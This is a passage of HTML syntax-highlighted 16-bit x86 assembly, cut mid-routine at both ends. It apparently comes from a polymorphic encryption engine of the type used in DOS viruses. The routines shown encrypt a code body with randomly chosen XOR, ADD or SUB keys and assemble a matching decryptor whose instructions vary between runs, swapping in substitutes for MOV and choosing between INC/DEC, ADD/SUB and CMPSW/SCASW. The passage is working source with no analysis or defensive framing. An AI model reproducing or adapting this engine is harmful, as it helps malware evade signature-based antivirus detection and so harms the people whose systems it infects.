</span><span class="sc5">lup</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">;encrypt code (words)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_encrypt</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">lup</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">klaar</span><span class="sc0">


</span><span class="sc5">blup</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">;encrypt code (bytes)</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_encrypt</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">blup</span><span class="sc0">

</span><span class="sc5">klaar</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;cx = length decryptpr + code</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;ax = length of decrypted code</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;di = offset encrypted code</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;ds:dx = decryptor + cr. code</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              encrypt the code</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">do_encrypt</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">add_val</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">lup1</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">lup1</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">lup2</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">lup2</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              generate mov reg,xxxx</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">do_mov</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">mov_byte</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;BX?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">is_not_bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_ind</span><span class="sc0">
</span><span class="sc5">is_not_bx</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0C</span><span class="sc0">                   </span><span class="sc1">;A*?</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">is_not_a</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">                   </span><span class="sc1">;A* or D*?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">is_not_a</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">is_not_a</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">alter</span><span class="sc0">                   </span><span class="sc1">;insert the MOV</span><span class="sc0">

                </span><span class="sc6">popf</span><span class="sc0">                            </span><span class="sc1">;A*?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">is_not_a2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xor_val</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">sss</span><span class="sc0">

</span><span class="sc5">is_not_a2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">;B*?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">is_not_b</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">where_len</span><span class="sc0">                
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">is_not_bh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">is_not_bh</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">sss</span><span class="sc0">

</span><span class="sc5">is_not_b</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;C*</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                   </span><span class="sc1">;byte or word encryption?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">sss</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;only half the number of bytes</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">sss</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;byte or word register?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">is_x</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;*H?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">is_not_h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">is_not_h</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">is_x</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              insert MOV or alternative for MOV</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">alter</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;use alternative for MOV?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_alter</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">30C0</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_sub</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">28</span><span class="sc0">
</span><span class="sc5">no_sub</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">maybe_2</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">maybe_2</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">add_mode</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">xlat</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc5">no_alter</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              insert ADD AX,xxxx</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">do_add_ax</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">add_val</span><span class="sc0">       </span><span class="sc1">;save add-value here</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8110</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8010</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_add_ax</span><span class="sc0">               </span><span class="sc1">;use ADD?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_add_ax</span><span class="sc0">               </span><span class="sc1">;use ADD?</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">do_81C2</span><span class="sc0">                 </span><span class="sc1">;AX or DX?</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">do_add0</span><span class="sc0">
</span><span class="sc5">do_81C2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C281</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">do_add0</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">no_add_ax</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              generate encryption command</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">do_xor</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">flags</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2E</span><span class="sc0">                   </span><span class="sc1">;insert CS: instruction</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">no_cs</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">                   </span><span class="sc1">;type of XOR command</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">xor1</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_xor</span><span class="sc0">                 </span><span class="sc1">;encrypt with register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_carry</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">save_it</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">xxxx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">xxxx</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_dir</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">yyyy</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">yyyy</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">             
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_get</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xor_offset</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">xor1</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">080</span><span class="sc0">                  </span><span class="sc1">;encrypt with value</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">save_it</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_xor</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_carry</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">xxxx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">xor_val</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">byte_word</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              generate increase/decrease command</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">do_add</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">;no CMPSW/SCASW if BX is used</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">da0</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">;ADD/SUB/INC/DEC or CMPSW/SCASW</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">do_cmpsw</span><span class="sc0">

</span><span class="sc5">da0</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;ADD/SUB or INC/DEC?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">add1</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                   </span><span class="sc1">;INC/DEC</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;up or down?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">add0</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">add0</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_ind</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                   </span><span class="sc1">;byte or word?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">return</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">;same instruction again</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">add1</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                   </span><span class="sc1">;ADD/SUB</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_clc2</span><span class="sc0">                 </span><span class="sc1">;carry?</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F8</span><span class="sc0">                  </span><span class="sc1">;insert CLC</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_clc2</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">083</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;up or down?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">add2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8</span><span class="sc0">
</span><span class="sc5">add2</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                   </span><span class="sc1">;carry?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_ac2</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0CF</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">no_ac2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_ind</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;value to add/sub</span><span class="sc0">
</span><span class="sc5">save_it</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">add_1</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_cmpsw</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;up or down?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_std</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc0">                 </span><span class="sc1">;insert STD</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_std</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;CMPSW or SCASW?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">normal_cmpsw</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">;no SCASW if SI is used</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">do_scasw</span><span class="sc0">

</span><span class="sc5">normal_cmpsw</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0A6</span><span class="sc0">                  </span><span class="sc1">;CMPSB</span><span class="sc0">
